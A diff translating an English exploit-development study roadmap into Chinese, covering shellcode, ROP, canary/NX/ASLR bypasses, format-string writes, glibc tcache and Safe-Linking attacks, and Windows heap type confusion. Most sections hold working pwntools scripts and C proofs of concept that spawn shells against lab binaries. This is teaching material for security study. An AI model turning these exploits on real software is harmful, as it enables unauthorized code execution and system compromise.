-push rax                 ; null terminator (instruction has no null byte)
+push rax                 ; 空终止符（该指令不含空字节）
 mov rax, 0x68732f2f6e69622f   ; "/bin//sh"
 push rax
 mov rdi, rsp
 
-; 4. Use test instead of cmp with zero:
-; BAD:  cmp eax, 0    -- 83 F8 00 (null)
-; GOOD: test eax, eax -- 85 C0    (no null)
+; 4. 用 test 代替与零比较的 cmp：
+; 差：cmp eax, 0——83 F8 00（含空字节）
+; 好：test eax, eax——85 C0（无空字节）
 
-; VERIFY your shellcode:
+; 验证你的 shellcode：
 python3 -c "
 sc = bytes.fromhex('YOUR_HEX_HERE')
 if b'\x00' in sc:
@@ -496,33 +496,33 @@ else:
 "
 ```
 
-### x86-64 Windows Shellcode -- PEB Walking
+### x86-64 Windows Shellcode——PEB 遍历
 
 ```nasm
-; Windows does NOT use the same syscall numbers as Linux.
-; Syscall numbers change between OS builds BY DESIGN to break exploits.
-; Correct approach: resolve function addresses at runtime via PEB walking.
+; Windows 使用的系统调用号与 Linux 不同。
+; 系统调用号在不同 OS 构建之间刻意变化，以破坏漏洞利用。
+; 正确做法：通过 PEB 遍历在运行时解析函数地址。
 
-; PEB WALKING THEORY:
-; PEB (Process Environment Block) is always at GS:[0x60] on x86-64 Windows.
-; PEB -> PEB_LDR_DATA -> InMemoryOrderModuleList:
-;   Entry 0: main executable
-;   Entry 1: ntdll.dll
-;   Entry 2: kernel32.dll  (what we want)
-; Walk PE export table to find GetProcAddress, LoadLibraryA.
-; Resolve any API at runtime.
+; PEB 遍历理论：
+; 在 x86-64 Windows 上，PEB（进程环境块）始终位于 GS:[0x60]。
+; PEB -> PEB_LDR_DATA -> InMemoryOrderModuleList：
+;   条目 0：主可执行文件
+;   条目 1：ntdll.dll
+;   条目 2：kernel32.dll（我们要的）
+; 遍历 PE 导出表以查找 GetProcAddress、LoadLibraryA。
+; 在运行时解析任意 API。
 
-; PATTERN in pseudocode:
+; 伪代码中的模式：
 ; GS:[0x60]                 -> PEB
 ; PEB + 0x18                -> PEB_LDR_DATA*
 ; PEB_LDR_DATA + 0x20       -> InMemoryOrderModuleList.Flink
-; Flink->Flink->Flink        -> kernel32 entry
-; Entry + 0x20               -> DllBase of kernel32.dll
-; Walk PE export directory   -> GetProcAddress
+; Flink->Flink->Flink        -> kernel32 条目
+; Entry + 0x20               -> kernel32.dll 的 DllBase
+; 遍历 PE 导出目录           -> GetProcAddress
 ```
 
 ```python
-# Use pwntools Windows shellcraft:
+# 使用 pwntools 的 Windows shellcraft：
 from pwn import *
 context.arch = 'amd64'
 context.os   = 'windows'
@@ -533,26 +533,26 @@ print(f'Hex: {sc.hex()}')
 ```
 
 ```bash
-# msfvenom for Windows payloads -- study the output, trace every instruction:
+# 用于 Windows 载荷的 msfvenom——研究输出，逐条指令追踪：
 msfvenom -p windows/x64/exec CMD=calc.exe -f c -b '\x00'
 ```
 
 ---
 
-## BLOCK 3: EXPLOIT MITIGATIONS AND BYPASS
+## 区块 3：漏洞利用缓解与绕过
 
-**Time: 4-6 weeks | Difficulty: Extreme**
+**时间：4-6 周 | 难度：极限**
 
-### Resources
+### 资源
 
-| Resource | Type | Duration | Cost | Notes |
+| 资源 | 类型 | 时长 | 成本 | 备注 |
 |---|---|---|---|---|
-| [ROP Emporium](https://ropemporium.com/) | Platform | 20 hrs | FREE | Do all 8 challenges. Designed for ROP. |
-| [Bypassing ASLR - YouTube](https://www.youtube.com/watch?v=7Tq7UHZXMHY) | YouTube | 2 hrs | FREE | Information leak to base calculation |
-| [Ropper](https://github.com/sashs/Ropper) | Tool | 1 hr | FREE | `ropper -f binary --search "pop rdi"` |
-| [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) | Tool | 1 hr | FREE | `ROPgadget --binary binary --rop` |
+| [ROP Emporium](https://ropemporium.com/) | 平台 | 20 小时 | 免费 | 完成全部 8 个挑战。专为 ROP 设计。 |
+| [绕过 ASLR - YouTube](https://www.youtube.com/watch?v=7Tq7UHZXMHY) | YouTube | 2 小时 | 免费 | 从信息泄露到基址计算 |
+| [Ropper](https://github.com/sashs/Ropper) | 工具 | 1 小时 | 免费 | `ropper -f binary --search "pop rdi"` |
+| [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) | 工具 | 1 小时 | 免费 | `ROPgadget --binary binary --rop` |
 
-### Mitigation Bypass Overview
+### 缓解措施绕过概览
 
 <div align="center">
 <table><tr><td>
@@ -563,35 +563,35 @@ msfvenom -p windows/x64/exec CMD=calc.exe -f c -b '\x00'
 </div>
 
 
-### Stack Canary Bypass -- Format String Leak
+### 栈 Canary 绕过——格式化字符串泄露
 
 ```python
-# File: bypass_canary.py
+# 文件：bypass_canary.py
 from pwn import *
 
-# WHAT A CANARY IS:
-# GCC inserts a random 8-byte value between local vars and saved RBP.
-# On return: compiler checks canary vs master copy -- mismatch -> abort()
-# KEY: Canaries always end in a null byte (lowest byte = 0x00).
-# Format string bugs bypass this because %p reads the stack directly.
+# 什么是 Canary：
+# GCC 在局部变量与保存的 RBP 之间插入一个随机 8 字节值。
+# 返回时：编译器将 canary 与主副本比较——不匹配则 abort()
+# 关键：Canary 总以空字节结尾（最低字节 = 0x00）。
+# 格式化字符串漏洞能绕过它，因为 %p 直接读取栈。
 
-# Step 1: Find canary position
+# 第 1 步：查找 canary 位置
 for i in range(1, 30):
     p = process('./vuln_with_canary_and_fmtstr')
     p.sendafter(b'> ', f'%{i}$p\n'.encode())
     line = p.recvline().strip()
     print(f'Arg {i:2d}: {line.decode()}')
     p.close()
-# Find the one that looks like: 0x1a2b3c4d5e6f7800 (ends in 00 = canary)
+# 查找形如 0x1a2b3c4d5e6f7800 的那个（以 00 结尾 = canary）
 
-CANARY_OFFSET = 11  # replace with your actual value
+CANARY_OFFSET = 11  # 替换为你自己的实际值
 
 p = process('./vuln_with_canary_and_fmtstr')
 p.sendafter(b'> ', f'%{CANARY_OFFSET}$p\n'.encode())
 canary = int(p.recvline().strip(), 16)
 log.success(f'Canary: {hex(canary)}')
 
-# Step 2: Build overflow preserving the canary
+# 第 2 步：构建保留 canary 的溢出
 payload  = b'A' * 64
 payload += p64(canary)
 payload += p64(0x0)
@@ -601,10 +601,10 @@ p.sendafter(b'> ', payload)
 p.interactive()
 ```
 
-### NX Bypass -- ret2libc
+### NX 绕过——ret2libc
 
 ```python
-# File: bypass_nx.py
+# 文件：bypass_nx.py
 from pwn import *
 
 elf  = ELF('./vuln_nx')
@@ -615,9 +615,9 @@ binsh_offset = next(libc.search(b'/bin/sh'))
 
 rop = ROP(elf)
 pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
-ret     = rop.find_gadget(['ret'])[0]    # alignment gadget
+ret     = rop.find_gadget(['ret'])[0]    # 对齐 gadget
 
-libc.address = 0x7ffff7000000    # replace with actual libc base
+libc.address = 0x7ffff7000000    # 替换为实际的 libc 基址
 
 system_addr = libc.symbols['system']
 binsh_addr  = libc.address + binsh_offset
@@ -625,7 +625,7 @@ binsh_addr  = libc.address + binsh_offset
 offset = 72
 
 payload  = b'A' * offset
-payload += p64(ret)          # align stack to 16 bytes
+payload += p64(ret)          # 将栈对齐到 16 字节
 payload += p64(pop_rdi)
 payload += p64(binsh_addr)
 payload += p64(system_addr)
@@ -634,12 +634,12 @@ p.sendline(payload)
 p.interactive()
 ```
 
-### ASLR + PIE Bypass -- Information Leak Two-Stage ROP
+### ASLR + PIE 绕过——信息泄露两阶段 ROP
 
 ```python
-# File: bypass_aslr_pie.py
-# Stage 1: Overflow -> leak GOT address -> calculate libc base
-# Stage 2: Return to main -> overflow again -> call system
+# 文件：bypass_aslr_pie.py
+# 第 1 阶段：溢出 -> 泄露 GOT 地址 -> 计算 libc 基址
+# 第 2 阶段：返回 main -> 再次溢出 -> 调用 system
 
 from pwn import *
 
@@ -656,7 +656,7 @@ main_addr = elf.symbols['main']
 
 offset = 72
 
-# Stage 1: Call puts(GOT[puts]) to leak real puts address
+# 第 1 阶段：调用 puts(GOT[puts]) 泄露真实的 puts 地址
 payload1  = b'A' * offset
 payload1 += p64(pop_rdi)
 payload1 += p64(puts_got)
@@ -676,7 +676,7 @@ log.success(f'libc base @ {hex(libc.address)}')
 system_addr = libc.symbols['system']
 binsh_addr  = next(libc.search(b'/bin/sh\x00'))
 
-# Stage 2: system("/bin/sh") with real addresses
+# 第 2 阶段：使用真实地址执行 system("/bin/sh")
 payload2  = b'A' * offset
 payload2 += p64(ret_gadg)
 payload2 += p64(pop_rdi)
@@ -687,20 +687,20 @@ p.sendlineafter(b'> ', payload2)
 p.interactive()
 ```
 
-### Building ROP Chains
+### 构建 ROP 链
 
 ```bash
-# Find gadgets:
+# 查找 gadget：
 ropper -f ./binary --search "pop rdi; ret"
 ropper -f ./binary --search "pop rsi; pop r15; ret"
 ROPgadget --binary ./binary --rop
 
-# Most needed gadgets:
-# pop rdi; ret         set RDI (1st argument)
-# pop rsi; ret         set RSI (2nd argument) -- often: pop rsi; pop r15; ret
-# pop rdx; ret         set RDX (3rd argument) -- VERY rare in non-libc binaries
-# ret                  stack alignment gadget
-# syscall              for direct syscall ROP chains
+# 最常用的 gadget：
+# pop rdi; ret         设置 RDI（第 1 个参数）
+# pop rsi; ret         设置 RSI（第 2 个参数）——常见形式：pop rsi; pop r15; ret
+# pop rdx; ret         设置 RDX（第 3 个参数）——在非 libc 二进制中非常罕见
+# ret                  栈对齐 gadget
+# syscall              用于直接系统调用的 ROP 链
 ```
 
 ```python
@@ -715,21 +715,21 @@ payload = flat({72: rop.chain()})
 
 ---
 
-## BLOCK 4: FORMAT STRING VULNERABILITIES
+## 区块 4：格式化字符串漏洞
 
-**Time: 1-2 weeks | MITRE: T1203**
+**时间：1-2 周 | MITRE：T1203**
 
-### How the Bug Works
+### 缺陷原理
 
 ```c
 printf(user_input);           // VULNERABLE: user controls the format string
 printf("%s", user_input);     // SAFE: format string is fixed
 
-// %p / %x: READ  a value from the stack  -> information leak
-// %n:      WRITE (bytes printed so far) to an address -> arbitrary write
+// %p / %x：从栈读取一个值 -> 信息泄露
+// %n：将（目前已打印的字节数）写入一个地址 -> 任意写入
 ```
 
-### Step 1 -- Stack Leak via %p
+### 第 1 步——通过 %p 进行栈泄露
 
 ```python
 from pwn import *
@@ -742,21 +742,21 @@ for i in range(1, 30):
     print(f'Arg {i:2d}: {val.decode()}')
     p.close()
 
-# Look for:
-#   0x7fff...       stack address (defeat PIE/ASLR)
-#   0x7f...         libc address  (defeat ASLR)
-#   0x???...???00   canary        (always ends in 00)
-#   0x401...        binary .text  (defeat PIE)
+# 查找：
+#   0x7fff...       栈地址（突破 PIE/ASLR）
+#   0x7f...         libc 地址  （突破 ASLR）
+#   0x???...???00   canary        （总是以 00 结尾）
+#   0x401...        二进制 .text  （突破 PIE）
 ```
 
-### Step 2 -- Arbitrary Write via %n
+### 第 2 步——通过 %n 进行任意写入
 
 ```python
 from pwn import *
 p   = process('./vuln_fmtstr')
 elf = ELF('./vuln_fmtstr')
 
-# Partial RELRO example: overwrite GOT[exit] with win():
+# Partial RELRO 示例：用 win() 覆盖 GOT[exit]：
 target_addr = elf.got['exit']
 new_value   = elf.symbols['win']
 
@@ -766,116 +766,116 @@ p.sendlineafter(b'Input: ', payload)
 p.interactive()
 ```
 
-### Step 3 -- Post-glibc 2.34: Write Targets Without `__malloc_hook` / `__free_hook`
+### 第 3 步——glibc 2.34 之后：无 `__malloc_hook` / `__free_hook` 的写入目标
 
-**CRITICAL FOR 2027:** glibc 2.34 (Ubuntu 21.10+) REMOVED `__malloc_hook`, `__free_hook`, `__realloc_hook`. Ubuntu 22.04 ships glibc 2.35. Ubuntu 24.04 ships glibc 2.39. ALL modern targets lack these hooks. Most tutorials you find online fail silently on any modern machine.
+**对 2027 至关重要：** glibc 2.34（Ubuntu 21.10+）移除了 `__malloc_hook`、`__free_hook`、`__realloc_hook`。Ubuntu 22.04 附带 glibc 2.35。Ubuntu 24.04 附带 glibc 2.39。所有现代目标都没有这些钩子。你在网上找到的大多数教程在任何现代机器上都会静默失败。
 
-**Available write targets on glibc 2.34+:**
+**glibc 2.34+ 上可用的写入目标：**
 
-1. `__exit_funcs` (atexit handler list) -- easiest
-2. FILE structure (FSOP -- File Stream Oriented Programming) -- powerful
-3. Stack return address (requires stack leak) -- always works
-4. TLS storage (`__pointer_chk_guard`) -- defeats pointer mangling
+1. `__exit_funcs`（atexit 处理程序列表）——最简单
+2. FILE 结构（FSOP——File Stream Oriented Programming）——强大
+3. 栈返回地址（需要栈泄露）——始终有效
+4. TLS 存储（`__pointer_chk_guard`）——突破指针混淆
 
 ```python
-# File: exit_funcs_exploit.py -- Complete __exit_funcs overwrite
-# Works when you have arbitrary write + libc leak on glibc 2.34-2.39
+# 文件：exit_funcs_exploit.py——完整的 __exit_funcs 覆盖
+# 当你在 glibc 2.34-2.39 上拥有任意写入 + libc 泄露时可用
 
 from pwn import *
 
 p    = process('./heap_or_fmtstr_vuln')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
-libc.address = 0x7f0000000000   # replace with actual
+libc.address = 0x7f0000000000   # 替换为实际值
 
 exit_funcs = libc.symbols['__exit_funcs']
-one_gadget = libc.address + 0xebc81   # find with: one_gadget libc.so.6
+one_gadget = libc.address + 0xebc81   # 用以下命令查找：one_gadget libc.so.6
 
-# Fake exit_function entry using flavor=0 (ef_free -- no pointer mangling):
+# 使用 flavor=0（ef_free——无指针混淆）伪造 exit_function 条目：
 fake = p64(0)           # next = NULL
 fake += p64(1)          # idx = 1
-fake += p64(0)          # flavor = 0 (ef_free: called directly, no demangle)
+fake += p64(0)          # flavor = 0（ef_free：直接调用，无需 demangle）
 fake += p64(one_gadget) # fn.free = one_gadget
-fake += p64(0)          # arg (ignored for ef_free)
+fake += p64(0)          # arg（ef_free 时忽略）
 
-# Write this struct to __exit_funcs using your write primitive
-# When exit() is called -> our one_gadget runs -> shell
+# 使用你的写入原语将该结构体写入 __exit_funcs
+# 当 exit() 被调用时 -> 我们的 one_gadget 运行 -> shell
 ```
 
 ```python
-# FSOP path -- glibc 2.35: study House of Apple
-# Reference: https://github.com/shellphish/how2heap
+# FSOP 路径——glibc 2.35：研究 House of Apple
+# 参考：https://github.com/shellphish/how2heap
 # git clone https://github.com/shellphish/how2heap
 # cd how2heap && ls glibc_2.35/
-# Study house_of_apple2.c and house_of_cat.c
+# 研究 house_of_apple2.c 和 house_of_cat.c
 ```
 
 ---
 
-## BLOCK 5: HEAP EXPLOITATION -- LINUX GLIBC MODERN
+## 区块 5：堆利用 -- Linux glibc 现代
 
-**Time: 4-5 weeks | Difficulty: Extreme**
+**时间：4-5 周 | 难度：极限**
 
-### Resources
+### 资源
 
-| Resource | Type | Duration | Cost | Notes |
+| 资源 | 类型 | 时长 | 成本 | 备注 |
 |---|---|---|---|---|
-| [pwn.college Heap Exploitation](https://pwn.college/system-security/heap-exploitation/) | Platform | 15 hrs | FREE | Best structured heap course. Do every module. |
-| [how2heap](https://github.com/shellphish/how2heap) | Repository | 10 hrs | FREE | Working examples of every heap technique. Primary reference. |
-| [glibc malloc internals](https://sourceware.org/glibc/wiki/MallocInternals) | Docs | 5 hrs | FREE | Read before how2heap. |
-| [HeapLAB Articles (CrowdStrike)](https://www.crowdstrike.com/blog/heap-exploitation-course-series/) | Articles | 8 hrs | FREE | Excellent technique deep-dives. |
+| [pwn.college 堆利用](https://pwn.college/system-security/heap-exploitation/) | 平台 | 15 小时 | 免费 | 结构最好的堆课程。完成每个模块。 |
+| [how2heap](https://github.com/shellphish/how2heap) | 仓库 | 10 小时 | 免费 | 每种堆技术的可用示例。首要参考。 |
+| [glibc malloc 内部结构](https://sourceware.org/glibc/wiki/MallocInternals) | 文档 | 5 小时 | 免费 | 在 how2heap 之前阅读。 |
+| [HeapLAB 文章（CrowdStrike）](https://www.crowdstrike.com/blog/heap-exploitation-course-series/) | 文章 | 8 小时 | 免费 | 优秀的技术深入分析。 |
 
-### glibc Allocator Internals
+### glibc 分配器内部结构
 
 ```c
-// Every malloc'd region is stored as a "chunk"
-// In-use chunk layout:
-// prev_size  (8 bytes)  size of prev chunk (only valid if prev is free)
-// size+flags (8 bytes)  size | A (NON_MAIN_ARENA) | M (MMAPPED) | P (PREV_INUSE)
-// user data  ...        <- malloc() returns pointer here
+// 每个 malloc 分配的区域都存储为一个 "chunk"
+// 使用中的 chunk 布局：
+// prev_size（8 字节）  前一个 chunk 的大小（仅当前一个空闲时有效）
+// size+flags（8 字节）  大小 | A（NON_MAIN_ARENA）| M（MMAPPED）| P（PREV_INUSE）
+// 用户数据  ...        <- malloc() 在此返回指针
 
-// BINS:
-// tcache:    per-thread cache | singly-linked | 7 chunks max per size class
-//            sizes: 24-1032 bytes | 64 bins | MINIMAL CHECKS -> primary target
-// fastbins:  singly-linked | chunks <= 160 bytes
-// unsorted:  landing zone before chunks sorted into small/large
-// small bins: doubly-linked | chunks < 512 bytes | integrity checks
-// large bins: doubly-linked with skip list | chunks >= 512 bytes
+// BIN：
+// tcache：   每线程缓存 | 单向链表 | 每个大小类最多 7 个 chunk
+//            大小：24-1032 字节 | 64 个 bin | 检查极少 -> 首要目标
+// fastbins：  单向链表 | chunk <= 160 字节
+// unsorted：  在 chunk 被分拣到 small/large 之前的着陆区
+// small bins：双向链表 | chunk < 512 字节 | 完整性检查
+// large bins：带跳表的双向链表 | chunk >= 512 字节
 ```
 
-### Technique 1 -- Tcache Poisoning (glibc < 2.32)
+### 技术 1——Tcache 投毒（glibc < 2.32）
 
 ```c
 char *a = malloc(0x20);
 char *b = malloc(0x20);
-free(a);   // tcache[0x20]: a -> NULL
-free(b);   // tcache[0x20]: b -> a -> NULL
+free(a);   // tcache[0x20]：a -> NULL
+free(b);   // tcache[0x20]：b -> a -> NULL
 
-// UAF write to freed b:
+// 对已释放的 b 进行 UAF 写入：
 *(char**)b = target_addr;
-// tcache[0x20]: b -> target_addr
+// tcache[0x20]：b -> target_addr
 
-char *p1 = malloc(0x20);    // returns b
-char *p2 = malloc(0x20);    // returns target_addr! arbitrary allocation
+char *p1 = malloc(0x20);    // 返回 b
+char *p2 = malloc(0x20);    // 返回 target_addr！任意分配
 strcpy(p2, shellcode_or_ptr);
 ```
 
-### Technique 2 -- Safe-Linking Bypass (glibc 2.32+: MANDATORY FOR 2027)
+### 技术 2——Safe-Linking 绕过（glibc 2.32+：2027 年必修）
 
-**CRITICAL:** glibc 2.32 introduced Safe-Linking. Ubuntu 22.04 = glibc 2.35. Ubuntu 24.04 = glibc 2.39. ALL use Safe-Linking. If you skip this, your tcache poisoning fails silently on every modern system.
+**至关重要：** glibc 2.32 引入了 Safe-Linking。Ubuntu 22.04 = glibc 2.35。Ubuntu 24.04 = glibc 2.39。全部使用 Safe-Linking。如果你跳过这一节，你的 tcache 投毒会在每个现代系统上静默失败。
 
 ```c
-// Pre-2.32: chunk->fd = next_free_chunk  (raw pointer)
-// Post-2.32: chunk->fd = next_free_chunk XOR (chunk_address >> 12)
+// 2.32 之前：chunk->fd = next_free_chunk（原始指针）
+// 2.32 之后：chunk->fd = next_free_chunk XOR (chunk_address >> 12)
 //
 // Key = (address_of_fd_field) >> 12
-// BYPASS: UAF-read a freed chunk that is LAST in its tcache bin
-//         (fd == NULL), so stored fd = NULL XOR key = key.
-//         Reading it gives you the key directly.
+// 绕过：UAF 读取一个在其 tcache bin 中位于最后的已释放 chunk
+//         （fd == NULL），因此存储的 fd = NULL XOR key = key。
+//         读取它就能直接得到 key。
 ```
 
 ```python
-# File: safelink_bypass.py
+# 文件：safelink_bypass.py
 from pwn import *
 
 p   = process('./modern_heap_vuln')
@@ -886,11 +886,11 @@ def free_chunk(idx): ...
 def read_chunk(idx): ...
 def write_chunk(idx, data): ...
 
-# Step 1: Prime tcache -- free one chunk (LAST in bin)
-alloc(0x28, b'AAAA')   # chunk A (idx 0)
-free_chunk(0)          # A's fd = 0 XOR key = key (last in bin)
+# 第 1 步：预热 tcache——释放一个 chunk（位于 bin 最后）
+alloc(0x28, b'AAAA')   # chunk A（索引 0）
+free_chunk(0)          # A 的 fd = 0 XOR key = key（位于 bin 最后）
 
-# Step 2: UAF read to leak Safe-Linking key
+# 第 2 步：UAF 读取以泄露 Safe-Linking key
 leaked_fd_bytes = read_chunk(0)
 key = u64(leaked_fd_bytes.ljust(8, b'\x00'))
 log.success(f'Safe-Linking key: {hex(key)}')
@@ -898,86 +898,86 @@ log.success(f'Safe-Linking key: {hex(key)}')
 heap_base_approx = key << 12
 log.success(f'Heap base (approx): {hex(heap_base_approx)}')
 
-# Step 3: Allocate more chunks -- the next free chunk fd will be mangled
-alloc(0x28, b'BBBB')   # chunk B (idx 1)
+# 第 3 步：分配更多块——下一个空闲块的 fd 将被混淆
+alloc(0x28, b'BBBB')   # 块 B（索引 1）
 free_chunk(1)
-free_chunk(0)   # double-free: tcache has B -> A
-# B's mangled fd = A_address XOR key
+free_chunk(0)   # 双重释放：tcache 中有 B -> A
+# B 被混淆的 fd = A 的地址 XOR key
 
-# Step 4: UAF write to chunk B -- forge mangled fd pointing to target
-target_addr = libc.symbols['__exit_funcs']   # or any write target
+# 第 4 步：对块 B 进行 UAF 写入——伪造指向目标的混淆 fd
+target_addr = libc.symbols['__exit_funcs']   # 或任意写入目标
 mangled     = (target_addr >> 12) ^ target_addr
 write_chunk(1, p64(mangled))
 
-# Step 5: Two allocations to reach target
-alloc(0x28, b'X'*8)    # gets B
-alloc(0x28, p64(one_gadget) + b'\x00'*20)  # gets target_addr!
+# 第 5 步：两次分配到达目标
+alloc(0x28, b'X'*8)    # 得到 B
+alloc(0x28, p64(one_gadget) + b'\x00'*20)  # 得到 target_addr！
 ```
 
 ---
 
-## BLOCK 6: WINDOWS HEAP EXPLOITATION
+## 区块 6：Windows 堆利用
 
-**Time: 3-4 weeks | Difficulty: Extreme**
+**时间：3-4 周 | 难度：极限**
 
-### Resources
+### 资源
 
-| Resource | Type | Duration | Cost | Notes |
+| 资源 | 类型 | 时长 | 成本 | 备注 |
 |---|---|---|---|---|
-| [Windows Heap Exploitation Part 1](https://www.youtube.com/watch?v=gL45bjQvZSU) | YouTube | 2 hrs | FREE | NT heap internals, free list corruption |
-| [Azeria Labs Heap Exploitation](https://azeria-labs.com/heap-overflow-sample-case/) | Blog | 3 hrs | FREE | Clear conceptual walkthrough |
-| [Windows 10 Segment Heap Internals (BlackHat 2016)](https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals.pdf) | PDF | 4 hrs | FREE | Mandatory for modern Windows heap |
-| [HEVD Pool Exploitation](https://connormcgarr.github.io/2020/12/05/Kernel-Pool-Internals/) | Blog | 3 hrs | FREE | Kernel pool from user-mode perspective |
+| [Windows 堆利用 第 1 部分](https://www.youtube.com/watch?v=gL45bjQvZSU) | YouTube | 2 小时 | 免费 | NT 堆内部结构、空闲链表破坏 |
+| [Azeria Labs 堆利用](https://azeria-labs.com/heap-overflow-sample-case/) | 博客 | 3 小时 | 免费 | 清晰的概念讲解 |
+| [Windows 10 Segment Heap 内部结构（BlackHat 2016）](https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals.pdf) | PDF | 4 小时 | 免费 | 现代 Windows 堆的必读材料 |
+| [HEVD 池利用](https://connormcgarr.github.io/2020/12/05/Kernel-Pool-Internals/) | 博客 | 3 小时 | 免费 | 从用户态视角看内核池 |
 
-### NT Heap vs Segment Heap Architecture
+### NT 堆与 Segment 堆架构
 
 ```
-NT Heap (classic, pre-Windows 10 RS4):
-  Used by: most legacy processes, cmd.exe, notepad.exe
-  Free list: doubly-linked list organized by size (ListHints, 128 entries)
-  LFH (Low Fragmentation Heap): activates after 18+ allocations of same size
-  Chunk header (8 bytes):
+NT 堆（经典，Windows 10 RS4 之前）：
+  使用者：大多数旧式进程、cmd.exe、notepad.exe
+  空闲链表：按大小组织的双向链表（ListHints，128 项）
+  LFH（低碎片堆）：同一大小的分配达到 18 次以上后激活
+  块头（8 字节）：
     [size:16][flags:8][smallTagIndex:8][PreviousSize:16][SegmentOffset:8][UnusedBytes:8]
 
-Segment Heap (Windows 10 RS4+, released April 2018):
-  Used by: Edge/Chromium, all modern UWP apps, Microsoft Office, system processes
-  Backend: large allocations (>= 128KB)
-  Large Block: >= 520KB
-  VS (Variable Size) allocator: handles 512B-128KB
-  LFH: handles allocations < 512B
-  Security features:
-    Header cookies (XOR'd with random per-heap seed)
-    Guard pages between segments
-    Randomized chunk ordering within LFH bins
+Segment 堆（Windows 10 RS4+，2018 年 4 月发布）：
+  使用者：Edge/Chromium、所有现代 UWP 应用、Microsoft Office、系统进程
+  后端：大块分配（>= 128KB）
+  大块（Large Block）：>= 520KB
+  VS（可变大小）分配器：处理 512B-128KB
+  LFH：处理小于 512B 的分配
+  安全特性：
+    头部 cookie（与每个堆的随机种子进行 XOR）
+    段之间的保护页
+    LFH bin 内块的随机排序
 
-KEY: In WinDbg: !heap -s  ->  look for "Segment heap enabled" flag
+关键：在 WinDbg 中：!heap -s  ->  查找 "Segment heap enabled" 标志
 ```
 
-### NT Heap -- LFH Type Confusion Attack
+### NT 堆——LFH 类型混淆攻击
 
 ```c
-// File: nt_heap_lfh_confusion.c
-// LFH activates after 18 allocations of the same size.
-// Different struct types with the SAME allocation size share a bucket.
-// UAF + controlled allocation = type confusion.
+// 文件：nt_heap_lfh_confusion.c
+// LFH 在相同大小的分配达到 18 次后激活。
+// 不同结构体类型若分配大小相同，则共享同一个桶（bucket）。
+// UAF + 受控分配 = 类型混淆。
 
 #include <windows.h>
 #include <stdio.h>
 
 typedef struct {
-    void (*callback)(void);  // function pointer at offset 0
-    char data[56];           // padding to 0x40 total
+    void (*callback)(void);  // 偏移 0 处的函数指针
+    char data[56];           // 填充至总共 0x40
 } ObjectA;
 
 typedef struct {
-    char input[8];           // attacker-controlled at offset 0
+    char input[8];           // 偏移 0 处由攻击者控制
     char padding[56];
 } ObjectB;
 
 int main() {
     HANDLE heap = GetProcessHeap();
 
-    // Trigger LFH for 0x40-byte bucket
+    // 为 0x40 字节桶触发 LFH
     for (int i = 0; i < 20; i++) {
         void *p = HeapAlloc(heap, 0, sizeof(ObjectA));
         HeapFree(heap, 0, p);
@@ -988,78 +988,78 @@ int main() {
 
     HeapFree(heap, 0, victim);
 
-    // LFH gives us the SAME chunk as victim
+    // LFH 把与 victim 相同的块给我们
     ObjectB *attacker = HeapAlloc(heap, 0, sizeof(ObjectB));
 
-    // Write our target address into ObjectB's input field (offset 0)
-    // This overlaps with ObjectA's callback field (also offset 0)
+    // 将目标地址写入 ObjectB 的 input 字段（偏移 0）
+    // 这与 ObjectA 的 callback 字段（同样是偏移 0）重叠
     void (*evil)(void) = (void(*)(void))0x00007ff700402020;
     memcpy(attacker->input, &evil, 8);
 
-    // UAF: trigger stale victim->callback
-    victim->callback();   // calls our target function
+    // UAF：触发悬垂的 victim->callback
+    victim->callback();   // 调用我们的目标函数
 
     return 0;
 }
 ```
 
-### Segment Heap VS Allocator -- Type Confusion Exploit (GAP CLOSED)
+### Segment 堆 VS 分配器——类型混淆利用（缺口已补齐）
 
-The Segment Heap's VS (Variable Size) allocator handles 512B-128KB allocations. Previous roadmap versions described the architecture without a working PoC. This section closes that gap.
+Segment 堆的 VS（可变大小）分配器处理 512B-128KB 的分配。早期路线图版本只描述了架构而没有可用的 PoC。本节补齐这一缺口。
 
 ```c
-// File: segment_heap_vs_confusion.c
-// Target: Process using Segment Heap (Edge, Office, modern UWP)
-// Technique: UAF -> re-allocate with controlled VS chunk -> vtable confusion
-// Requirements: Windows 10 RS4+ VM, WinDbg Preview
+// 文件：segment_heap_vs_confusion.c
+// 目标：使用 Segment 堆的进程（Edge、Office、现代 UWP）
+// 技术：UAF -> 用受控的 VS 块重新分配 -> vtable 混淆
+// 要求：Windows 10 RS4+ 虚拟机、WinDbg Preview
 
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 
-// Custom heap using HeapCreate to guarantee Segment Heap behavior:
-// HeapCreate with HEAP_NO_SERIALIZE on RS4+ defaults to Segment Heap.
+// 使用 HeapCreate 的自定义堆以保证 Segment 堆行为：
+// 在 RS4+ 上，带 HEAP_NO_SERIALIZE 的 HeapCreate 默认使用 Segment 堆。
 
-// --- Struct definitions (same size in VS allocator range: 0x80 bytes each) ---
+// --- 结构体定义（在 VS 分配器范围内大小相同：各 0x80 字节） ---
 
 typedef struct VictimObj {
-    void  (**vtable)(void);  // vtable pointer at offset 0
+    void  (**vtable)(void);  // 偏移 0 处的 vtable 指针
     DWORD  refCount;
-    BYTE   data[116];        // pad to 0x80 = 128 bytes total
+    BYTE   data[116];        // 填充至 0x80 = 总共 128 字节
 } VictimObj;
 
 typedef struct ControlObj {
-    ULONG_PTR gadget_addr;   // overlaps with vtable pointer at offset 0
-    BYTE      padding[120];  // pad to 0x80 = 128 bytes total
+    ULONG_PTR gadget_addr;   // 与偏移 0 处的 vtable 指针重叠
+    BYTE      padding[120];  // 填充至 0x80 = 总共 128 字节
 } ControlObj;
 
-// Attacker-controlled function that runs when victim->vtable[0]() is called:
+// 攻击者控制的函数，在 victim->vtable[0]() 被调用时执行：
 void __cdecl evil_payload(void) {
     printf("[+] Code execution via Segment Heap type confusion!\n");
-    // In a real exploit: shellcode, token steal, LPE chain
+    // 在真实利用中：shellcode、令牌窃取、LPE 链
     system("cmd.exe");
 }
 
-// Fake vtable: one entry pointing at evil_payload
+// 伪造的 vtable：一个指向 evil_payload 的条目
 void (*fake_vtable[1])(void) = { evil_payload };
 
 int main(void) {
-    // Create a heap that uses Segment Heap (RS4+ default behavior)
+    // 创建一个使用 Segment 堆的堆（RS4+ 的默认行为）
     HANDLE heap = HeapCreate(0, 0, 0);
